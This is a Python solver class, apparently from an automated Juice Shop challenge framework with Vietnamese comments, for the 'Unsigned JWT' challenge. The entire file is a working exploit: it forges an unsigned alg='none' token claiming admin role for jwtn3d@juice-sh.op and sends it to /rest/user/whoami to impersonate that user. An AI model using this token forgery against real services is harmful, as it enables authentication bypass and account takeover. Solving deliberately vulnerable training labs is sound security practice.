from core.base_solver import BaseSolver
from loguru import logger
import base64
import json

class UnsignedJwtSolver(BaseSolver):
    """
    Challenge: Unsigned JWT (jwtUnsignedChallenge)
    
    Tạo JWT với alg='none' để mạo danh jwtn3d@juice-sh.op
    """
    @property
    def challenge_key(self) -> str:
        return "jwtUnsignedChallenge"

    def _b64url(self, data: dict) -> str:
        """Base64 URL encode"""
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',', ':')).encode()
        ).decode().rstrip('=')

    def solve(self) -> bool:
        # Header: Thuật toán 'none'
        header = {"alg": "none", "typ": "JWT"}
        
        # Payload: Thông tin user giả
        payload = {
            "data": {
                "id": 666,
                "email": "jwtn3d@juice-sh.op",
                "username": "jwtn3d",
                "role": "admin"
            }
        }
        
        # Token = header.payload. (không có chữ ký)
        token = f"{self._b64url(header)}.{self._b64url(payload)}."
        
        # Sử dụng token giả mạo
        headers = {"Authorization": f"Bearer {token}"}
        response = self.client.get("/rest/user/whoami", headers=headers)
        
        if response.ok:
            logger.info("Unsigned JWT: Impersonated jwtn3d@juice-sh.op")
            return True
        else:
            logger.error(f"Unsigned JWT failed: {response.status_code}")
            return False
